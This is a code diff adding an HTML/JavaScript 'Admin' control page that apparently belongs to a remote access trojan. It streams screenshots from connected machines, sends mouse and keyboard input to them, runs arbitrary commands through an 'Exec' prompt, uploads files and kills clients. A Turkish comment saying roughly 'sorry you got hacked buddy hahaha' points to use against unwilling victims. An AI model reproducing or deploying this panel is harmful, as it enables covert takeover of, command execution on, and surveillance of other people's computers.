@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.2/socket.io.js"></script>
+
+</head>
+<body>
+    <script>
+      var process = {}
+      var autoq = true;
+      var ping = 10000000
+      var quality = 1
+      var interval = ""
+      var machine = "<%= machine %>"
+      function startstream(){}
+      document.addEventListener("DOMContentLoaded", function() {
+const socket = io({
+    auth:{auth:"a1"}
+});
+
+var mousemove = false;
+
+startstream = function(x,c){
+  if(c){
+    autoq = false;
+    socket.emit("adminmessage",{
+    machine:machine,
+    quality:Number(x)
+  });
+  }else{
+clearInterval(interval);
+interval = setInterval(()=>{
+  if(autoq){
+    if(ping > 1000) quality -= 1 
+    if(ping < 400) quality += 1 
+    if(quality < 0) quality = 1
+    if(quality > 100) quality = 100
+    socket.emit("adminmessage",{
+    machine:machine,
+    quality:quality
+  });
+  }
+  socket.emit("adminmessage",{
+    machine:machine,
+    screenshot:true,
+    time:Date.now()
+  });
+},x || 250)
+}
+}
+startstream()
+
+socket.on('adminmessagec', data => {
+  if(data.machine != machine) return;
+  if(data.screenshot){
+    const base64Data = data.screenshot;
+    const blob = new Blob([base64Data], { type: 'image/png' });
+    const imageUrl = URL.createObjectURL(blob);
+    URL.revokeObjectURL(document.getElementById("screenshotImg").src);
+    document.getElementById('screenshotImg').src = imageUrl;
+    ping = Date.now()-data.time
+    document.getElementById("pingg").innerHTML = "Ping:"+ping+"ms"
+  }
+  if(data.process){
+    process = data.process
+  }
+
+});
+
+document.getElementById('screenshotImg').addEventListener("mouseup",function(event){
+  event.preventDefault();
+  var type = ""
+  if (event.button === 0) type = "left"
+  if (event.button === 1) type = "middle"
+  if (event.button === 2) type = "right"
+  socket.emit("adminmessage",{ machine:machine,mouseup:type})
+})
+document.getElementById('screenshotImg').addEventListener("contextmenu",function(event){
+  event.preventDefault();
+})
+document.getElementById('screenshotImg').addEventListener("mousedown",function(event){
+  event.preventDefault();
+  var type = ""
+  if (event.button === 0) type = "left"
+  if (event.button === 1) type = "middle"
+  if (event.button === 2) type = "right"
+  console.log(type)
+  socket.emit("adminmessage",{ machine:machine,mousedown:[event.clientX,event.clientY,type]})
+})
+document.getElementById('screenshotImg').addEventListener("wheel", function(event) {
+  socket.emit("adminmessage",{ machine:machine,scroll:event.deltaY})
+});
+document.getElementById('screenshotImg').addEventListener("mousemove",function(event){
+  if(!mousemove) return;
+    socket.emit("adminmessage",{ machine:machine,move:[event.clientX,event.clientY]})
+})
+window.addEventListener("keydown", function(event) {
+  event.preventDefault();
+    socket.emit("adminmessage",{ machine:machine,keydown:event.key.toLocaleLowerCase().replaceAll("arrow","") })
+})
+window.addEventListener("keyup", function(event) {
+  event.preventDefault();
+    socket.emit("adminmessage",{ machine:machine,keyup:event.key.toLocaleLowerCase().replaceAll("arrow","") })
+})
+
+var filename = ""
+
+document.getElementById('fileInput').addEventListener("change",function(event){
+  var fileInput = event.target
+  var file = fileInput.files[0];
+  if (file) { socket.emit("adminmessage",{ machine:machine,file:[filename,file]})}
+})
+
+document.getElementById('execa').addEventListener("click",function(event){
+  const userInput = prompt("Exec:");
+if (userInput !== null) {
+ socket.emit("adminmessage",{ machine:machine,exec:userInput})
+}})
+
+document.getElementById('writetexta').addEventListener("click",function(event){
+  const userInput = prompt("Paste text:");
+if (userInput !== null) {
+ socket.emit("adminmessage",{ machine:machine,writetext:userInput})
+}})
+
+document.getElementById('filea').addEventListener("click",function(event){
+  const userInput = prompt("Filename:");
+if (userInput !== null) {
+  filename = userInput
+  document.getElementById('fileInput').click()
+}})
+
+document.getElementById('killa').addEventListener("click",function(event){socket.emit("adminmessage",{ machine:machine,kill:true})})
+document.getElementById('movemousea').addEventListener("click",function(event){mousemove = !mousemove})
+
+});
+
+
+
+    </script>
+  
+  <img id="screenshotImg" style="position: absolute; z-index: -1;">
+
+<div class="menubb" style="z-index: 100; padding-bottom: 10px;">
+  <button onclick="menu()" class="menub" id="menub" hidden> </button>
+  <label class="menubText" for="menub">Toggle Menu</label>
+</div>
+  <br>
+  <br>
+  
+
+  <style>
+
+    .menubText{
+      width: 75px;
+      height: 50px;
+      background-color: indigo;
+      color: white;
+      padding: .5rem;
+      font-family: sans-serif;
+      border-radius: 10%;
+      cursor: pointer;
+      margin-left: .2rem;
+      position: relative;
+      top: 1rem;
+      transition: ease-in-out .1s;
+    }
+  </style>
+
+
+
+<div class="container">
+ 
+
+ <div class="buttons" style="z-index: 100;">
+  <button class="ustbutton" id="execa">Exec</button>
+  <button class="ustbutton" id="filea" >File</button>
+  <button class="ustbutton" id="killa" >Kill</button>
+  <button class="ustbutton" id="writetexta" >Write text</button>
+  <button class="ustbutton"  id="movemousea" >Movemouse</button>
+  <button class="ustbutton"  onclick="navigator.clipboard.writeText(JSON.stringify(process,null,2))" >Copy process</button>
+  <button class="ustbutton"  onclick="startstream(prompt('FPS:'))" >Restream</button>
+  <button class="ustbutton"  onclick="startstream(prompt('0 to 100:'),'q')" >Quality</button>
+  <label class="uploadtext" for="fileInput">Choose file</label>
+
+</div>
+<br/>
+
+<input type="file" name="file" id="fileInput" hidden/>
+<a class="pingtxt" id="pingg" >Ping</a>
+</div>
+
+  
+<script>
+  var isZero = false;
+  function menu(params) {
+    console.log(isZero)
+    if(isZero != true) { 
+     document.querySelector(".container").style.display="none"
+      isZero = true
+    } else{
+      document.querySelector(".container").style.display="inline"
+      isZero = false
+    }
+  }//Üzgünüm hacklendin dostum hahaha
+</script>
+
+  <style>
+
+    .menub{
+      margin: 10px 3px 10px;
+    }
+
+body {
+margin: 0;
+  overflow: hidden;
+  user-select: none;
+
+  }
+  img {
+    user-select: none;
+    border: none;
+    size: 100%;
+  }
+
+    .ustbutton{
+      float: left;
+      margin-right: 10px;
+      border-radius: 10%;
+      width: 100px;
+      height: 25px;
+      border: 0;
+      box-shadow: 5px 4px 10px black;
+      transition: ease-in-out .1s;
+    }
+        .pingtxt{
+      color: red;
+    }
+
+    .buttons{
+      display: inline-block;
+      padding-left: 0;
+      padding-bottom: 1rem;
+    }
+
+    .ustbutton:hover{
+     width: 120px;
+     height: 40px;
+     font-size: 110%;
+     background-color: rgb(160, 158, 158);
+    }
+
+    .uploadtext{
+      width: 75px;
+      height: 50px;
+      background-color: indigo;
+      color: white;
+      padding: 0.5rem;
+      font-family: sans-serif;
+      border-radius: 10%;
+      cursor: pointer;
+      margin-left: .2rem;
+     transition: ease-in-out .1s;
+    }
+
+    .uploadtext:hover{
+      font-size: 110%;
+      background-color: rgb(51, 4, 85);
+    }
+
+  </style>
+</body>
+</html>
